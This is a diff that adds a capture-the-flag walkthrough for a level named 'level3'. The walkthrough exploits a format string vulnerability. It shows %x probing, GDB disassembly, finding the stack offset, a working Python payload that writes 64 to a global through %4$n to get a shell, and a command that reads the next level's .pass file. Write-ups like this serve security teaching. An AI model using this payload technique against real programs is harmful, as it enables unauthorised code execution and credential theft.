@@ -1,0 +1,61 @@
+# Level3 - Format String Vulnerability
+
+---
+
+# Walkthrough
+
+## Step 1: Test the program
+```bash
+./level3
+hello
+hello
+```
+
+The program reads input and prints it back.
+
+## Step 2: Check for format string vulnerability
+```bash
+./level3
+%x %x %x %x
+200 b7fd1ac0 b7ff37d0 25207825
+```
+
+It prints memory values instead of `%x`. **Vulnerable!**
+
+## Step 3: Analyze with GDB
+```bash
+gdb level3
+(gdb) disas v
+```
+
+Key lines found:
+```asm
+mov    0x804988c,%eax    ; Load global variable
+cmp    $0x40,%eax        ; Compare with 64
+jne    skip              ; If not 64, skip shell
+call   system@plt       ; If 64, execute shell
+```
+
+**Conclusion:** If variable at `0x804988c` equals `64`, we get shell.
+
+## Step 4: Find the offset
+```bash
+./level3
+AAAA %x %x %x %x %x %x
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
+```
+
+`41414141` (our "AAAA") is at **position 4**.
+
+## Step 5: Build the exploit
+```bash
+(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
+```
+
+## Step 6: Get the flag
+```bash
+whoami
+cat /home/user/level4/.pass
+```
+
+---
